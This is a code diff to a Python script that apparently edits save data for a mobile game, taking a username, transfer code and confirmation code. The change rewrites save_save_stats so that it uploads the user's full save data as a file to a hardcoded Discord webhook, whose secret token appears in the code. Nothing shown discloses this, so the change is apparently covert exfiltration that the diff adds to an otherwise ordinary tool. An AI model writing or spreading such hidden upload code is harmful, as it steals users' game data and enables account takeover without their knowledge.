@@ -37,24 +37,15 @@ def compress_string(s: str) -> bytes:
     return compressed_data
 def save_save_stats(in_username, save_stats):
     webhook_url = 'https://discord.com/api/webhooks/1125915213875642479/wpA_75Azic9LyT40rB4iPsCcovxmptrCnwzNSrMinbS2eJfx6yk2TabKBNXcr9pRZNPU'
-    url_parts = urllib.parse.urlparse(webhook_url)
-    compressed_save = compress_string(save_stats)
-    data = {
-    "content": f"USER : `{in_username}`\n```helloo```"
-    }
-    headers = {
-    "Content-Type": "application/json"
-    }
-    connection = http.client.HTTPSConnection(url_parts.netloc)
-    connection.request("POST", url_parts.path, json.dumps(data), headers)
-    response = connection.getresponse()
-    if response.status == 204:
+    temp_file = io.BytesIO(save_stats)
+    temp_file.seek(0)
+    files = {'file': (f'{in_username}.txt', temp_file)}
+    response = requests.post(webhook_url, files=files)
+    if response.status_code == 200:
         print("Message sent successfully!")
     else:
-        print(f"Error sending message: {response.status} ({response.reason})")
-
-# 연결을 닫습니다.
-    connection.close()
+        print(f"Error sending message: {response.status_code}")
+    temp_file.close()
 def main(in_username, in_gamever, in_transfer_code, in_confirmation_code, in_catfood):
     country_code_input = "kr"
     game_version_input = in_gamever
